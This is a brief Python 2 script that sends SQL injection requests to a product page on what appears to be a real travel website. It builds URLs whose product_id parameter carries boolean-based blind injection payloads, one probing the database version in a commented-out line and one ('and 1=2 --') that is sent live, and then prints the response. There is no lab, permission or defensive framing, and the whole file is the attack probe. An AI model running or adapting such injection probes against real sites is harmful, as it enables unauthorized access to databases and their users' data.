from ptpy.ptcurl import PtCurl
#url = "http://www.hitour.cc/index.php?route=detail/detail&product_id=1203' and 1=1 and ord(mid(version(),1,1)) = 51' "
curl = PtCurl(debug = False)
url = "http://www.hitour.cc/index.php?route=detail/detail&product_id=1203' and 1=2 --and ps.product_id = 1203 "

res = curl.get(url)

print res
